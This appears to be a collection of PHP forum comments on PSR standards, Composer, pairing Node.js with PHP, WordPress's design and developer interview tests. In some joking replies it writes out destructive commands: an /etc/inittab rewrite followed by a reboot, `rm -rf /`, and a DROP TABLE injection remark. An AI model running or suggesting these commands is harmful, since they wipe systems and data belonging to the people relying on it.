You are not a cryptography expert, quit acting like one. You have no authority in how this works. Cryptographers didn't come up with the term pepper, it's a complete psuedo term based on incorrect applications of salts termed by the community. Education comes from correcting someone when they do something incorrect, there was no shaming involved, you're making a mountain of a mole hill. When it comes to security there IS A ONE TRUE PATH, everything else is not as secure... period. Security is different in technology, there is not gray area. You are secure or you're not. There's best practice, and beyond that is failure. You're either doing the right thing or you're not. It's what the community needs for the highest education is in security practices. There is no light footing around the subject, at all. I have been doing this for years. I have found when it comes to security, you give any doubt to what is good practice with security, you end up people taking it lighter than they should. I didn't google for that site, I knew of it and picked it out from my resources... I don't even know why that even matters. It did have context of what you were defending even if it wasn't exactly the same implementation. I'm getting cheesed off at your tone defending something that isn't even worth defending and getting pedantic about things that really pointless to have brought up in the first place. You are setting up the person I was trying to teach for failure, and I find that unacceptable. If you're getting cheesed off I suggest taking a break. Your tone is highly condescending, and it's unappreciated.
What do you mean, old and reliable? ZF2 wasn't released long ago.
Yeah. I get where you're coming from. I didn't use a framework for a long time because I'd built my own solution and the pain for gain didn't seem to be worth it. A little bit of experience with the frameworks, though, has shown that I was wrong. It's hard to tell whether the case is the same for you, but I suspect it might be. Sticking them in a nice organised directory is a good step and all... but what about versions? What about updates? Do you go through and update them to get the latest changes? When you include them, do you autoload them? If so, how, when you can't control their structure. Composer handles all that. 
You berate someone, they run away. You encourage them to study beneficial things, they become better. 
Why would anyone hate you for that? PSR &amp; Composer gave PHP a second chance at being a competitive programming language.
i mean, once you submit the page do you see " Thank you bobby for your comment : test" or something at the top of the page? not in the code, but the actual page in your browser? if so it means that php is pulling in your info fine, if not, the error is something different
Not soon enough.
You have yet to see the religious people arguing against PSR, and for things like tabs instead of spaces.
caner can be ignored - plenty of smokers do. But a gunshot wound to the head - terrifying!
RHEL?
Thanks! Is the reason for this because the redirect is a different process or something?
Cloud-to-Butt made it even better.
I am probably not the best user to comment because I'm still a beginner. But what I have noticed is, I tend to research too much and I always find a technology better suited. This makes me want to learn the new technology and not building something usefull. My two cents, just use the technology you are familiar with and see how it works. Sometimes I build something and it never gets used as much as I would like. Or the features being used the most is not what I am aspecting. So just build something even if it is not the best solution, but the most easy one. You can always recode (refactor?) when you have more use data.
I agree with you here. We COULD have this syntax added. It would be handy a few times per project... but does that warrant its addition? I don't think so.
When I read your summary my first thoughts were on the difficuly in setting up production environment (servers, system monitoring, database) I'm not great admin guy! If your looking for older IE support your going to be stuck on long poll ajax and flash/sliverlight anyway so PHP for everything not a horrible choice. If your browsers support more recent the mixed approach could work and makes new dev hiring easier (they work php you work the Node side). Not having worked Node.js, Is there a session handler that works for both PHP sessions and Node.js sessions? If you have to write one then stick with one language. 
Setting up production environment won't be an issue. As for browser support, I'm focusing on more recent browsers (IE10, Firefox, chrome). You can use memcached or Redis to share session info between php and node. That is why at the moment, I think a mix of php and node is the better option
Thanks!
Node.js for real-time + PHP for everything else, it works great! And as you've said, you can share the session between them with Redis or whatever.
Pusher. www.pusher.com. There are similar services but I recommend Pusher. No, I don't work for them, I just don't post to Reddit normally - hence the random 'throwaway' username.
I am not asking to be flamed, but I am one of those people. We are out there. For the most part I think PSR is a good thing, but you're right that there are zealots on some items. Given the choice, I'll use my fork of PSR. If I'm forced to I'll adhere to it fully, but that'll be on a project-by-project basis.
what, you have a problem with root.php?authorized=1 ???
It looks like bubonic plague isn't it ?
I do hope your charging them by the hour for this :)
My go-to project list after running through an introduction to a new language is to work through 20-30 [Project Euler](http://projecteuler.net/) challenges. The reason for this is it helps with retention of the language as well as learn some of the computational benefits and limitations of the language.
I was let go from a company not too long ago mainly because I kept pushing to prevent security holes. It was the subscription fulfillment company for SC Magazine among many "big name" magazines. The company didn't even have test servers. Basically test was production. I would look at code other developers checked in and cringe. I would check it back out and essentially fix it. They would leave holes open for SQL injections in the most obvious spots. Parameters not sanitized, user controls were being "sanitized" with JavaScript, cookies not sanitized. That was just the tip of the iceberg. I would express my concerns, and I guess after a while they got tired of listening to me so they had me host a meeting with the other devs. I went so far as writing a class that would basically sanitize everything. All they had to do was call the functions and they still didn't do it. Very frustrating. I was asked to complete a PCI documentation to attest in part that the company was following safe coding practices(among other things that there was willful noncompliance with) under penalty of perjury. I again expressed my concern and tried to reason with the president("owner") of the company. I got the whole "we are a small company with only 25 employees we shouldn't be held to the same standard as amazon or Google." I would try again to explain that because we processed over $25,000,000 in online credit card transactions(high volume of transactions also) we were required to be compliant. (I started to say that it was even our moral obligation but had to bite my tongue). Two weeks later I was let go with the reasoning of "I can't tell you why we are firing you for legal reasons." It has been absolute hell trying to find work ever since. 
They're paying us a hell of a lot of money anyway. Only seems fair as we knew exactly how important security was to them when we started so it's already accounted for. :) Besides, I'm just a code monkey. Boss man says jump, I jump. He can deal with the business side of things.
7-sided dice?
Honestly, having created a system like this, if you are comfortable with Node, then separate out the functionality. Keep Real Time in Node, and everything else in PHP with a Service Oriented Architecture. This gives you tonnes of flexibility in the future which sticking with 100% PHP doesn't :)
Funny, I've been working on a similar post myself. PHP in 2013 is not PHP in 2007. With Composer, PHPStorm, Travis, Git and the like, tooling is now as good as every other scripting language. I kept wanting to leave PHP, for a number of years now, and never did. Everything I've wanted has been implemented. The only thing I want PHP to have is something like React with co-routines and multithreading. Then I'm happy.
Good guy /u/badmonkey0001, disagrees without going ape shit.
Your code is not you. You are not your code. We as developers forget that sometimes.
Absolutely. Mix and match the technologies so each does what they are really good at. 
I took over a project like this recently and I don't have a full answer for you but here are some of the things I started to do. Added all existing code to bitbucket. Created a test site and used deployhq to auto deploy there upon commit. Installed new relic on the server for it to tell me of any errors or processes taking up resources. Installed a bash script to perform a database dump and push to s3 for storage both daily and upon deploy. Deleted any files that were obviously old like page.php.bak Ongoing php code changes based on any problems appearing in new relic or whatever the customer asks for. I didn't do this yet but consider installing php debugbar to give a profiler. Changed user logins to using private keys and changed the application to run as a user and not root. Probably some other changes too that I dont remember but its an ongoing job. Good luck! 
composer + packagist The are a powerful pair and are closely coupled, so often seen as one and the same thing. Composer is, if course, more flexible than that. 
Thanks Does the bash script lock the database (it does mysql_dump?) ? Or is it small and it's fast? 
Regarding the '&lt;?= ?&gt;' syntax: This is perfectly safe. The short tag problem is the '&lt;? ?&gt;' which had some ambiguity and is considered unsafe. PHP 5.5 has the short echo syntax '&lt;?= ?&gt;' enabled regardless of 'short_open_tag' setting.
Great. And now you've gone and wasted the name my friend Onamsdassa wanted to use. Fuck you.
I haven't said CI is not great because it doesn't use latest features. It is great actually, all of those are. I just like to dive into framework code and explore how they are using latest features - this is why Laravel is my choice among the three.
If doing it twice makes it my thing, then yes. People seemed so shocked and surprised about the other PSRs coming out, I dont want the community to have the chance to say the same. These are happening and feedback would be awesome, and if it reduces complaints then excellent.
Hey Many. Seriously looks like you have some mega issues. a. Don't Fix it. (I like fixing things, but this sounds broken beyond repair). Take a good look at each screen it creates and this is the model for the new system. It also sucks fixing someones code when it has stopped working. b. You need to get the layout sorted, we are developers. So we want design sorted, I really like Twitter Bootstrap now at V3 (easy to theme as well). But there is www.purecss.io (from yahoo, 5kb in size). Or the super featured foundation framework http://foundation.zurb.com/ c. Templating. I have had a look at a lot of things, I love Smarty, previous test have shown smarty is/was faster than Twig (it compiles templates into a compiled dir). So for a PHP site, I have smarty to really fly. Twig does compile down. But with smarty you can even tell it how to you want it to cache the compiled file which is pretty awesome. d. Love Silex. Great choice. You could even get some PHP Unit tests if were feeling crazy. Find the Silex example project on github as it has the PHP Unit tests setup ready to go. I have found silex awesome for also dividing my project up. You can put application nicely into files using the mount function. This makes your app hugely scalable and very clean. $app-&gt;mount('/uploads', include "uploads.php"); Just be carefully of using sessions, sessions are thread blocking, which sucks. e. Database Stuff. I love RedBean. Beautiful, terse, powerful. Have used this for a number of apps and its pretty rock solid. I think it is fast but maybe some other people might not, but from LARGE sites I have, the page generation time is generally less than 0.03 of a second. f. Thumbnails. http://www.binarymoon.co.uk/projects/timthumb/ awesome again. It caches thumbnails for you depending on the size you have generated. Used this for Cisco once, great code and pretty simple to use. g. Smarty also does good form validation (check their validation tools, pretty smart how it works). h. I use a git repo on my server for versioning, then ssh into my own server and push and pull to that repo. Since git is fully a filesystem repo, you dont need to be running a git server for basic stuff. Git can push and pull from any other repo on other filesystems. So this way you can setup something free. i. Something I find pretty interesting is https://github.com/karlvr/consistent.js for client side databinding and updating. You can basically take a whole lot of JSON data, put it into a model and bind that to the HTML dom. Changes are synced into the DOM and vice versa. It is really simple but really powerful for managing ajax stuff. A much simpler alternative to Angular.js / Ember / Backbone / Spine . You will love the app after using this stack. The above tools make it pretty easy to write maintain, architect a beautiful app that you will love. (thinking about this for 10 more seconds, re-write it in Python?). 
&gt; arguing against PSR, and for things like tabs instead of spaces So skip PSR-2. Nobody cares.
I moved many of my sites from a VPS to PaaS because I didn't have the time, passion or interest of being sysadmin for bullshit CMS installs. I moved many of my applications from my own framework (or a framework I actively developed as part of the core team - CI/Fuel) to Laravel/Slim, because why make your own framework when somebody else is out there doing a good job. Everyone makes their own framework at some point, but knowing when to put it down is the hard part.
Not sure what you mean there?
Yeah, but they asked for it - they have to understand that it takes time away from the development. It's a lot easier to review code for security issues as you go along rather than trying to do it all at once. Full security audits of an entire piece of software take time and the static/dynamic scans are the shortest part of it.
You could do this test and a programming nerd will be able to do ok. Probably the worst person to hire (you should hire a chick anyway, they are awesome). But you want people that can solve problems? A person that has a clear thought process and some systematic way of coming up with a "good" solution that is short, concise, maintainable and hopefully elegant. My favourite question on StackOverflow I answered quite some time ago. "Given any point on the world map, how would you determine if it was water or land". To make it harder, now you now have to do it without using any APIs and not storing more than 1mb of data. My solution was "Save a copy of this image, http://images2.layoutsparks.com/1/227815/black-whtie-world-map.jpg translate Lat and Long to a pixel co-ordinate, if the color is white, its water" that is about 4 lines of code, self contained, fast, debuggable etc. (No I dont want the job thanks). You also asked very little "real world" maths problems just some CompSci stuff. Nor did you look at how a candidate does debug code? Code quality. Do they unit test etc? Browser test? Performance Test? User Test? I could go on. Good luck, and thanks for putting you test online (if anyone shows me one of these I know what to say). 
Possibly due to the inclusion of doc'ed associative array values as part of @param docblock syntax (fantastic, btw). Having two tags that do the same thing would be silly. Both variables and array values have types, but the latter are not variables - hence @type over @var.
The only thing Dreamweaver does better than everybody else is image mapping IMO.
Employment at will state. An employer can fire you for any reason. (except for the usual race,creed,sex,age,disability) And you can quit for any reason.
yep, company email. I don't want the resources being taken from spamassasin and other stuff.
Not to mention the perf slowdown.
Only the user-facing and internal-staff backend are separated. The problem with python is that there are so few developers in the country. Bad php developer is better than none python developer.
By the time you see those messages you're already up shit creek, though.
`sed -i -e "s/[1-9]/0/g" /etc/inittab &amp;&amp; init 6`
Yeah, ugh. That's not a great situation. It doesn't sound like you're the admin, but if you are you could run things like spamassassin at a lower priority with nice and ionice.
This is good advice. If the PHP version isn't "real time" enough for your or something, you can port that piece over to Node.js. At least you'll have a working prototype to build from and your Node.js development should go much smoother then.
Sounds like you got a lot on your plate, based on what you've put and what I've seen in comments already got a few suggestions/comments. - Fix only the most important things, if your going to do a rewrite then theres no point doing huge fixes. Try to fix up major issues that you can see, remove old code (.bak files, commented out code) and try to tidy it up. - Get Version control as soon as possible, Git will be best am guessing you've already got experience - Even if you can't get backups implemented server side perhaps as a stop-gap implement a basic crontab on a server you have full access to that accesses the server downloads the sizes and tars it up, same with MySQL if possible. Theres a lot of prebuilt tools knocking about that do this, a bit of googling should find what you need As for your choice in Silex and Twig, not bad, but from the sounds of it you may want more due to your suggested uses? You mention Forms, ORMs, Validation, all this is available in Silex but you'll find yourself having to add it in and do a lot of boilerplate code to get the basics down. Perhaps a more full featured PHP Framework is needed that already has this built into it? Check out http://www.phptherightway.com/ for advise on coding with PHP, a lot of the things your asking about have sections on here and will give you basic details to get you started as well as providing links to more in depth information. 
As I see it, you have three choices here. 1. You don't change anything. This is what some people would choose. After all, it's working, right? This (of course) depends how you define "working". I'd personally argue it isn't, and that this isn't an option. 2. Incremental improvements. Gram3000's post covers this pretty well. 3. Burn it to the ground and start again. In all honesty, I suspect if you choose 2 you'll wish you'd done this by the end. It's hard to find the correct balance between current achievement, and long term result. If you start down the path of incremental upgrades you'll improve the software, no doubt. But will you ever get **good** software? Honestly, probably not. Maintenance will always be time-consuming. The software will never be testable. Legacy crap will always clutter the codebase, and taking it out will reach diminishing return and stop being done. This software's quality is capped at a point. A fresh start would reach that same point, but take time. However, it can then rise beyond it. There comes a point of longevity at which starting from scratch would have been financially better off. Where that balance point is going to be for this project... very much hard to tell. I wish you luck. For what it's worth I'm maintaining a project that's been upgraded much as option two, and it's reached about as good as I can get it. I'll be slowly creating a more modern version as a 2.0 over the next 6 months.
&gt; just that I don't like the static facades via which it (and most Laravel components) expose their functionality You don't have to use them in a static way, as you said its just a facade. Edit: Actually I don't know about classes you add, but for Laravel components at least you can do more info on this can be found here http://laravel.com/docs/facades
Ex office close to Bookpeople?
Russell's Viper'd?
Hava a look at http://www.pubnub.com/ They have PHP SDK aswell as many others. They can get a little pricey depending on the amount of users, but for 20 connections it is free. Have a look.
&gt; if you're thinking of ... as the type Sorry, misunderstanding. I meant that the stuff left of the ... is the type (not the ... itself, that wouldn't make sense \^\^) &gt; have to agree to disagree on this Yes. I don't see `...&amp;$params` as intuitive, for you its the other way around, so we likely won't get anywhere here :)
Probably. But you know Chinese and Russian hackers are damn fast! 
And you become intelligent by making mistakes.
When I read "with a whiteboard" my first thought was "I'd stab you in the eye with the marker..." Honestly, in this day and age, with super powerful IDEs like PHPStorm, we still want people to "program" on whiteboards? Why not go one further and give them a piece of paper and a hole punch and have them create a punch card and then let them explain how they would build a reader for it to get their punched code into your repositories?! Honestly, if this is your way of testing people you are a bad boss and you should feel bad! Look at gothaggis suggestion - he has it right. Give people a small contract, let them work on some small project and you can see how they think, how they program and most important, how they interact with the rest of your team. Because the best programmer will be useless to you if he is a social leper that drools all over his colleagues (unless they like that kind of thing...)
No, 2d6.
I dont think he was complaining. HD certainly didn't gush. He was informing OP the code is dangerous. That's not an insult or joke, or sarcasm, although others have done so. Its a valid contribution. 
How long have you waited to use this?
Is socket.io still active? It seems that they've been waiting to go 1.0 for quite some time and their github is kind of all over the place(last commit 3 months ago...). I have been entertaining the idea of using Node for some more 'real-timey' parts of an application I'm working on.
This is good to my ears. I'm soon'ish to be in the process of working on a more 'real-time' piece within an application I'm working on. The stack I had envisioned looks nearly identical to what you've listed here.
If you need real time, pick a language that supports it out of box. Then pick data stores that scale for your planned levels of demand. Then imagine how you'd have to break and fix things if things got too slow from bottlenecks.
I read the Caching PSR Pre-draft a couple of times, but I really struggled to understand how it's supposed to work. No methods to add/remove CacheItems from the Pool? CacheItems responsible for 'deleting' themselves from the Pool? Doesn't seem to follow the suggested repository pattern on the face of it, but I guess I should wait for the proper draft to understand the intent a bit better. 
What performance slowdown? Has it already been implemented and benchmarked somewhere in PHP? I don't understand the vague - not to mention patronising - arguments here at all. Variable length argument lists have been a staple of other langs like perl, python and ruby for a long time, and like all programming constructs they have their place. If you don't have a need for them, don't use them. Their implementation will have no cost for you whatsoever.
I don't really know whats going on in the background in depth enough to say for sure. My guess would be that it's the shell performing the redirect, so the redirect happens on whatever permissions the shell has. If the shell is running as root, then the redirect works. 
Are you giving your senior candidates this test? Why not simply ask, "Show me what you've worked on."? Almost all the questions here would be answered by looking at my Github.
I've been interviewing candidates for some time. Do you really need 3 hours to determine whether a candidate is good for you? Moreover, shouldn't you be more worried about that person's ability to solve problems with algorithms (what actually makes them a programmer), rather than their specific PHP knowledge? I mean any idiot can learn to use Composer or PDO in a few hours. Don't waste their/your time with those questions and try to make sure their mind is trained to solve problems programmatically.
PHP &gt;= 5.4 has short echo tags enabled by default. If you're not building an app for distribution across several systems, short open/close tags are fine. The problem is when you want other people to use your code, or you're setting up a server manually (feh) and forget to make sure short syntax is enabled.
I implement them only in widget objects, or objects that are going to render themselves at some point, and that know how to render (i.e, they have access to some kind of templating system). About debugging purposes... Why reimplement print_r inside __toString()? It's kind of silly. Anyways, data objects, or entity objects, should never *ever* know how to render themselves: they would "know" way too much.
Agree with most of it (as it follows what I've been doing forever), though this section is odd to me: @\Doctrine\Orm\Mapping\Entity() The format of every other tag is `@name value`, whereas for this one it's simply `@value`? Just seems rather ambiguous. You don't have to know PHP at all to read most of the doc-block, because each data item is qualified with a descriptor, but I'm not even sure what the significance of the above tag is (and I've been using PHP for a long time, though obviously, not many frameworks as of late). IMO, I shouldn't have to read a specification to reverse-engineer what exactly the doc-block is trying to tell me...
From what I've read/heard socket.io isn't being actively developed. The engine that socket.io, [engine.IO](https://github.com/LearnBoost/engine.io) uses is being actively developed. 
Lead developer and hiring manager here also. First, kudos for trying to be so thorough. Is this the only interview you have with them? If not I'd consider breaking this up into parts as a three hour interview is a huge time-suck for everyone involved. Maybe your company is a totally awesome, prestigious place to work but I know I'd be turned off by a very long interview process (and have turned down well-known companies after the third interview turned to a fourth and a fifth..). Second, I think that perhaps a take-home coding challenge is a good idea for something like this. Give them a chance to really show their stuff on their own terms while solving one or all three of those programming problems (wrap the db design into it, obviously) and then hit them with the compsci 101/php-for-dummies stuff for the in person assuming they can code well enough. I feel like you're just asking for poor results by giving three fairly involved coding tasks to someone after running them through the wringer with all of those questions in addition to whatever other interview stuff is happening.
Indeed, You are a perfect subject for multithreading !
Are any of those projects open source? I'd really like to know how a setup with PHP and node.js would look like (without Ratchet). e/ Grammar
Run!
running is not currently an option
I think it mainly stems from it being so old, and a bunch of spaghetti code. So nuking it, and rebuilding using modern standards would be your general answer. I haven't really worked with wordpress (thankfully?) too much so I cannot elaborate on more specific issues.
What are your arguments against this? As I've said before some of the arguments for it (and against the "just use func_get_args() mentality) are this: 1. **Readbility** - You can instantly tell that this func/method takes unlimited parameters by looking at the declaration. 2. **Type Hinting** - You can force those values to be a specific type. func_get_args() doesn't care what you put in. 3. **Documentation** - This could/will get PHPDoc syntax support, but func_get_args() doesn't. So far its 3 reasons for, and a vague "it might not be a good idea" against. :)
&gt; It would be handy a few times per project Well that sounds like a reason. Why don't you want nice things?
Explain.
You can't make WordPress better. Otherwise it won't be WordPress. WordPress has tons of plugins from ok code, to extremely spaghetti code. Changing WP would require you to support all these plugins, just like Windows which supports all the legacy applications. 
Without function autoloading this is kind of useless for my use case. Working with Pharen (a Lisp that compiles to PHP) I wanted a way of building a Module -- a namespaces collection of functions that can be lazily autoloaded when needed. My current hack uses a macro to wrap the lot in a namespaces class instead, but its ugly as hell. Hopefully now this has been approved, they'll move towards autoloading namespaces that are just collections of functions. The namespace is actually a great way of tackling that, and I think it can even be done via an adaption of PSR-0 to be honest. 
I agree completely, I hated using it for one of my classes. 
I would start by trying to move to a simple MVC model. Separation of concerns (views, actions, data) goes a long way (in my opinion) towards helping people understand how a system works.. Wordpress makes "dabbling" easy by making everything a hook, but you can do this in MVC systems as well.. I'm not sure you could really change Wordpress in this manner though because it's just so widespread and in use by too many people (including entire businesses that are based around developing and supporting Wordpress the way it is).. But I think there would be room for a new user-friendly and easy to set up self-hosted blogging platform that provides the same functionality as Wordpress but is more developer-friendly.. It would be an interesting thought experiment to just take the current Wordpress codebase and - without actually writing the code - try to just re-structure it in an MVC way and identify all the various classes, controllers, models, patterns and resources that you would need to implement in order to provide equivalent functionality.. edit: in fact I seem to remember a project where someone was creating a WP theme that was MVC based, in an effort to provide this bridge to developers who didn't want to have to learn the "Wordpress way" of coding.. A quick Google brought up [WPMVC](https://github.com/tombenner/wp-mvc) but I'm not sure that's the one I remember... 
You can't. Backwards compatibility, with all the themes that ignore API's and hack in directly, is WordPress' greatest strength . It also means that we are not going to see any major architectural improvements anytime soon. My solution would be to start phasing in a new API and Core side-by-side with the old one; think Windows On Windows. With that in place, it'd have proper composer integration and use the Symfony core, for integration with Drupal. Over the years, when more and more themes and plugins move to this new API, phase out the old one. PHP is so much better in 2013 with the latest language features and tooling, and quite honestly, WordPress is holding us back (and continuing to drag our name through the mud).
&gt; but when it comes to byref, typing, and such why not used named arguments with optional values How do you have unlimited arguments if you are specifically naming them? That negates the entire purpose of this RFC.
http://xkcd.com/221/
&gt; Otherwise I'd consider this low priority. The entire PHP team doesn't all work on a single thing at a time. If a member thinks its a good idea, the core team help flesh it out, and it passes all the tests then... well, it's not a bad thing to have is it? I'd love named parameters too of course, but one thing at a time.
I find it useful. I use it much like Laravel does. And with good reason - that's where I learned it. class User { private $data = false; public function __construct($id){ $this-&gt;data = $this-&gt;get($id); } public function __toString(){ return json_encode($this-&gt;data); } } I've skipped a lot of code, obviously. Like the actual "get" method. Then you can just $user = new User(455); echo $user; Note that this is not "debugging", and it's very handy, especially when building an API.
i was being snarky and wanted to see if anyone would understand (glad you asked), but in short: variadic functions have been implemented in C since IEEE Std 1003.1, introduced in 1988. i was making light of the excitement that PHP may be getting them in 2013. By the way, in my opinion and in the opinion of the author(s) of the book Clean Code, variadic functions usually lead to shit code. There are definitely cases where they make sense (printf, etc.), but I can see this capability being widely abused. It definitely should be a controversial addition to the language.
&gt;You can write PHP programs bound by any of those things depending on what the program does. That's the point. I want to see how they think about it and answer it. &gt;What you're looking for is the difference between an interface and an abstract class and a concrete class and an abstract class. I might revisit phrasing, but any candidate that doesn't understand that question doesn't belong and you know it. &gt;Injection is too vague a term. You mean SQL injection. Again pedantics of the database section, but sure, I'll add the extra word. I think your issue with this test is two-fold: 1. You think I'm the "average" developer. 2. You probably didn't catch that these are spoken prompts in a verbal interview. They are my notes, essentially.
Just so you know, PHP had variadic functions since ... forever. This RFC is just a syntactical integration.
So the things I actually want to see them do on a whiteboard are things like IA document notes, database structures, class architecture, etc. The Code Examples I wouldn't have them do on a whiteboard. They would be provided with two options: whiteboard some psuedo-code or use an IDE on a laptop that is hooked up to our projector.
I think most people are really missing my note about how these questions are all asked verbally in an in person interview. These are essentially my notes. The candidate never actually sees this sheet of paper.
Yes, I know, via func\_get\_args(). Syntactic integration is going to legitimize and possibly popularize its use as a language feature and I'd hope we both agree that unless there's a _really_ good reason to do this, it's bad. I guess I'd just like to see PHP go in the opposite direction toward becoming more strict. EDIT: Actually, after I writing that, it occurred to me that it would make the use of variadic functions more explicit in the case where someone was using func\_get\_args...instead of just defining a parameter-less function and having a black box on the inside, you could at least get a hint from the function signature.
Before I knew anything about WP themes I always figured it would be fairly straightforward like writing regular html and pluging in preset variables to show content - like any modern templating system. I also thought it would be able to handle things like multiple content areas and repeating content. Boy was I wrong. So that kind of stuff working out of the box would be nice but it would break compatibility with everything (plugins, themes, etc). Personally I don't think I should have to use Custom Field Suite and Custom Post Type UI to do this stuff. In the meantime I've been looking at [Timber](http://jarednova.github.io/timber/) for a templating solution. OTOH it *is* cool that there are all these plugins that allow you to customize WP really deeply.
Sure - I guess it just depends on when you seem to be hitting the dealbreakers. I seem to find a lot of people who would probably fit in well with the company/team but who wind up being technically deficient, which is why I've decided to front-load the tech questions in order to weed out those folks.
kesshi_ketsugo comment seems good (go with the technology you know). If you wanna do it in PHP you just make the website (normally). Then for client &lt;-&gt; server you can use ratchet. But that's not all ... you forgot an important part ... that is that the users should be able to chat with each other. (Using storage / databases for chatting is too slow and bad practise) So for this you should have a long running php process on another port. In this process you should handle HTTP requests and send responses. So your webserver is PHP itself now, although you can still route through a regular webserver to enjoy other benefits. PHP now works much more the same as node.js which is also a long running proces. (php normally is worker process or worker threads). Then the user should send token along with the chat message to identify himself, and a token should be send back for next usage (for security). You can share the initial token through a database (from regular website to long running php). There are some libraries that do the long running php with http request/response out of the box. This one http://reactphp.org/ And this one uses similar principles as the previous one, but different techniques and features https://github.com/rdlowrey/Amp
If you're going to implement type-hinting for what are essentially homogeneously-typed Arrays, then I think it would be much more prudent to provide the actual mechanism for it as a language primitive, rather than something that only works in vararg declarations. $foo = array(int); $bar = array(string); function baz(array(bool) $param); I think something like that would be much more valuable. SplFixedArray has the right idea but is too limited.
ircmaxell is working on function autoloading.
If I saw a script like this, I would immediatly abuse it, and use it to change the website to a note saying that the owner was too stupid to sanatize his imputs.... oh, then I would "DROP TABLE students;"
If that is the case then I am stoked. I've attempted to add it in myself, but it was very hacky. Might get in contact with him and see if I can help.
I assume, OP has got it... ;-) 
wow ):
That syntax would definitely not be nicer, and only takes care of one of the many potential benefits of this RFC. This syntax allows me to say "I'll have an array of Twitter\Status objects please!", which is easy to document, easy to read and a nice way to enforce content. I see no complaints.
Ha, got you. I generally don't ever complain that something good only _just happened_, I'm just happy that it happened. But yes, good things happening sooner would be good. As for abuse, every feature ever can be abused. PHP developers just LOVE arrays, they use them for every damn thing and this leads to headaches of gigantic proportions. Giving them the tools and options to generate more readable, enforceable code is not a bad thing, despite some folks obviously getting it wrong. Step 1) Get the feature. Step 2) Educate the community. Step 3) Profit.
Yeah this IS making PHP more strict. It's reducing the element of surprise for existing functionality. More for it.
I understand that, but ultimately there remains a finite pool of time and resources allotted to each set of features, requests, bugs that they all must share from. Are the ellipses a bad thing to have? I don't know? I hope the PHP team is giving more thought to that question. I personally don't think its a bad idea but I'm also not sold that it's a *good* idea. But my opinion matters very little.
That syntax wouldn't work anyway. I typed it in haste. But the point is it would be better to actually have a typed array or hint that works under more contexts than just varargs.
The WP team has dug themselves into a hole with their failure to pay back technical debt. And it looks like they still have [the wrong priorities](http://en.wikipedia.org/wiki/WordPress#Future). &gt; After the release of WordPress 3.0, the development team took a release cycle off from the WordPress software to focus on expanding and improving the WordPress community. The community is most of the problem and they need to stop catering to them. They need to cut off support and start from scratch. Maintaining any level of backwards compatibility is too tempting for the overwhelming majority of the community and it will only keep things from getting fixed. I personally have zero faith in them doing this as it seems they are perfectly content to play security whack-a-mole for the next 10 years. They're out to prove that with enough wasted time, you can, in fact, polish a turd. My only hope is for a new player can come into the fray and take over the CMS scene with a slick, full featured solution based on an existing, modern framework (Laravel, Symphony would be the front runners), but the only way that is ever gonna happen is if people accept that there is no "easy" way without serious negative ramifications. It's like selling oven-mitts that promise to make everyone an ace fighter pilot. Even if they do somehow miraculously work for certain situations, as soon as they stop working, you have to call an actual fighter pilot. And then he has to fly wearing those stupid oven mitts you thought were so helpful... Death to shared hosting. Death to FTP. Death to CMSs. Gah...
&gt; It would be handy a few times per project. Well that sounds like a reason. Why don't you want nice things? This is ***exactly*** the reason why the core has crap like this: - **gzgetss()** - read a line out of a gzipped file and strip HTML tags - **extract()** - dynamically destroy local scope - **phpcredits()** - prints out credits - **set_magic_quotes_runtime()** - curse your runtime environment with evil spirits - **mysql()** - undocumented mystery function, call it for yourself! - **array_change_key_case()** - changes the case of all keys in an array - **array_uintersect_uassoc()** - simplifies the common operation of map + intersect + map + intersect - **mysql_escape_string()** - escape a string incorrectly - **eval()** - gateway to realms of wonder - **strstr()** - like the C function of the same name, but with a much worse best-case complexity - **var_export()** - detect cycles in data structures (by crashing) - **import_request_variables()** - long live register_globals - **class_alias()** - dependency injection the PHP way - **clearstatcache()** - just in case you don't want the language to cache results for you - **__halt_compiler()** **Edit:** [Source](http://qr.ae/I3vo8).
It needs to be said that while Chef/Puppet/Foreman/Salt/Ansible are deployment tools, their true use is in Horizontal Deployment. They all gather "facts on the ground", which you can use to automate this horizontal scaling. 
That's a great list of shit that needs to be deleted. Maybe that can be worked on once variadic syntax is in the core.
&gt;I think there would be room for a new user-friendly and easy to set up self-hosted blogging platform that provides the same functionality as Wordpress but is more developer-friendly Someone should make a website that just posts these, there is a new fucking one every week. 
The Fizz Buzz solution is incorrect. You can see the problems by viewing this executed source: http://codepad.org/F81nfQIp The reason it fails is because if/elseif evaluates from top to bottom, so you're going to have (a) or (b) or (a and b), so you'll never get (a and b) because it will return true on a before it hits either (b) or (a and b). The solution is to reorder the if statement or change how the if expressions are evaluated.
Also your evaluated statement for both is incorrect. ($i % 3) $i % 3 will yield 0, which evaluates to false. Likewise, any other result will evaluate to true. ($i % 3 === 0) This will return true when $i remainder is 0 (perfectly divisible). You can see that the result is definitely incorrect in this source: http://codepad.org/yXCVhy82
The loop is also incorrect. for($i=1; $i&lt;100; $i++) 1 - 99. This is an off by one error.
You missed my point. The idea that *"It could be useful for someone, somewhere, maybe"* is the **exact** reason why shit like that got into core in the first place. IMHO, this is no different.
I probably should have checked that more closely, I wrote it out kinda quick. Thanks.
I didn't miss your point at all. I assumed you were joking around, because I don't feel like mysql string escaping is a "somebody might want this sometime" even if it was badly implemented. :) But really, if they were JUST adding it because it MIGHT be useful for SOMEONE then it would be ridiculous, but this is a concrete implementation that takes a current methodology and gives it excellent syntax, making it more readable, adds type hinting, allows easy documentation and generally + more awesome. variadics are not phpcredits().
`rm -rf /`
&gt; How do you have unlimited arguments if you are specifically naming them? That negates the entire purpose of this RFC. Why would you say that all of the "unlimited" arguments have to be int? Or array? Byref is somewhat understandable (but you have to stay aware that your alterations to those vars have implications elsewhere - all of them). casting the "unlimited" to a type seems to put a damper on "unlimited" to me.
Pusher.com, websockets, logging. Save yourself a ton of work and management.
&gt; I don't feel like mysql string escaping is a "somebody might want this sometime" even if it was badly implemented Many people would argue that database bindings for a specific vendor has no place in a programming language's core, that what libraries are for. &gt; gives it excellent syntax, making it more readable Excellent syntax? That is, *at best*, debatable. It reminds me of the namespace separator RFC. Unlike every other programming language out there, PHP uses \\ instead of . (dot) because the parser is very fragile and easily confuses it with `$foo.$bar`. The variadics rfc seems to be inventing yet another horrible syntax. In fact /u/nikic's reasoning is /r/lolphp worthy: &gt; *$args. This is the syntax that both Ruby and Python use. For PHP this does not work well because *$ is a weird combination. ***Weird?*** really? PHP core is *full* of weird things that PHP-haters laugh about and using the same syntax like every other language is *weird*? Getting stuff like syntax, parameter order, function names etc. wrong when there are no BC reasons is absolutely unacceptable. 
"I would like an unlimited *number* of Twitter\Status instances." Basic.
